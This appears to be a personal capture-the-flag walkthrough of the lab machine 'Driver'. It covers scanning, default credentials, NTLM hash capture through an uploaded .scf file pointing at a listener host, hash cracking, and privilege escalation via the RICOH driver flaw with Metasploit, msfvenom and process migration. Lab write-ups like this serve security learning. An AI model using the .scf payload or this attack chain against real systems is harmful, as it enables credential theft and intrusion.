
2026-08-12 09:04

Tags: 

## Driver

- Nmap
	- ![](Pasted%20image%2020260812091225.png)
	- 80, 135, 445, 5985
	- Notice the 'admin' account
	- ![](Pasted%20image%2020260812091253.png)
	- The password is admin lol
	- ![](Pasted%20image%2020260812095004.png)
	- Cannot list this share without password
	- ![](Pasted%20image%2020260812095030.png)
	- Nothing really interesting in the directories


- Website
	- ![](Pasted%20image%2020260812095107.png)
	- Something related to printers?
	- ![](Pasted%20image%2020260812095140.png)
	- Can upload file
	- This time we use `.scf` files because we can see the writable SMB share where we can upload files through this portal
	- ![](Pasted%20image%2020260812095615.png)
	- .scp file:
	- `[Shell]`
	`Command=2`
	`IconFile=\\[Listener-IP]\share\icon.ico`
	`[Taskbar]`
	`Command=ToggleDesktop`
	- Set up Responder to capture the hashes
	- ![](Pasted%20image%2020260812101313.png)
	- Captured !
	- ![](Pasted%20image%2020260812101615.png)
	- Use hashcat -m 5600
	- ![](Pasted%20image%2020260812101749.png)
	- tony:liltony
	- ![](Pasted%20image%2020260812102023.png)
	- Connect to the machine using evil-winrm


- Escalation
	- ![](Pasted%20image%2020260812102528.png)
	- Upload Winpeas to the machine by evil-winrm
	- Found the PS history file through Winpeas
	- ![](Pasted%20image%2020260812105521.png)
	- ![](Pasted%20image%2020260812105553.png)
	- Using RICOH PCL6 UniversalDriver V4.23
	- Do some research, found out that it is vulnerable to CVE-2019-19363
	- Use it in msfconsole with the name ricoh_driver_privesc
	- Somehow the winrm_script_exec does not work, so I create a msfvenom payload and upload it to evil_winrm
	- ![](Pasted%20image%2020260812112411.png)
	- Set up the handler
	- ![](Pasted%20image%2020260812112429.png)
	- Now try the exploit, but i am stuck
	- ![](Pasted%20image%2020260812113455.png)
	- Need to make my session an `interactive` one
		- **Interactive session/token** is required because non-interactive shells (like WinRM, WMI, or background service tokens) lack the desktop environment and full security privileges of a logged-in user.
			- **Access User-Specific Credentials:** Access decrypted DPAPI keys, browser passwords, and Kerberos tickets loaded only in a logged-in user's active session (`HKEY_CURRENT_USER`).
    
			- **Bypass Service Isolation (Session 0):** Execute tools that interact with the desktop, screen, clipboard, or keystrokes, which are completely blocked in background service sessions.
    
			- **Handle Prompts & Inputs:** Run tools or binaries that freeze or crash when expecting a TTY interface, console buffer, or standard user input/UAC prompt.
    
			- **Bypass UAC Restrictions:** Certain local administrative tasks and privilege escalation vectors require an elevated interactive logon token rather than a filtered remote network token.
	- Make this interactive
		- Use ps to list running processes
		- ![](Pasted%20image%2020260812114430.png)
		- Look for the `session` column, fint the `1`
		- Use `migrate [ID]` to migrate
			- **Allocates Memory:** Opens a handle to the target process and allocates read/write/executable memory inside it.
    
			- **Injects Shellcode:** Copies the Meterpreter DLL/shellcode into that allocated memory space.
    
			- **Creates Remote Thread:** Creates a new thread inside the target process (`CreateRemoteThread` on Windows) to execute the injected code.
    
			- **Transfers Connection:** Switches the active C2 communication channel from the old process to the new thread, then terminates the old process thread.
		- ![](Pasted%20image%2020260812114620.png)
		- It's working now!
		- ![](Pasted%20image%2020260812114837.png)

## References:

